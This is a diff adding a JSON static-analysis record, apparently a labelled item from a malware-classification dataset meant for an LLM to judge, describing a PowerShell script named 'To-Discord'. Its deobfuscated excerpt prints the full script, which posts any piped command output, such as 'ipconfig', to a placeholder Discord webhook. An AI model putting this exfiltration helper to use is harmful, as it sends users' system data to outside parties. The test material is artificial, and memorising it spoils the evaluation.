@@ -1,0 +1,69 @@
+{
+  "meta": {
+    "quelldatei": "tech_055_To-Discord.ps1",
+    "sha256": "64f6eaec61855ac32d414ddb96a9950f1565f2090dcf2c9b790900d95c94b964",
+    "groesse_bytes": 588,
+    "zeilen": 17,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "YOUR WEBHOOK HERE",
+      "```",
+      "application/json",
+      "Output is empty or not valid for sending."
+    ],
+    "string_anzahl_gesamt": 5,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "YOUR WEBHOOK HERE",
+      "```",
+      "application/json",
+      "Output is empty or not valid for sending."
+    ],
+    "string_anzahl_gesamt": 5,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Out-String",
+      "To-Discord",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "YOUR WEBHOOK HERE",
+      "```",
+      "application/json",
+      "Output is empty or not valid for sending."
+    ],
+    "string_anzahl_gesamt": 5,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Out-String",
+      "To-Discord",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "# Send the output of Powershell commands directly to a webhook. Example: ipconfig | To-Discord\r\n\r\nfunction To-Discord {\r\n    param (\r\n        [string]$webhookUrl = 'YOUR WEBHOOK HERE'\r\n    )\r\n    \r\n    $output = $input | Out-String\r\n    $content = '' + $output.Substring(0, [math]::Min($output.Length, 1994)) + ''\r\n    \r\n    if (-not [string]::IsNullOrEmpty($content.Trim())) {\r\n        irm $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content=$content} | ConvertTo-Json)\r\n    } else {\r\n        Write-Host \"Output is empty or not valid for sending.\"\r\n    }\r\n}\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
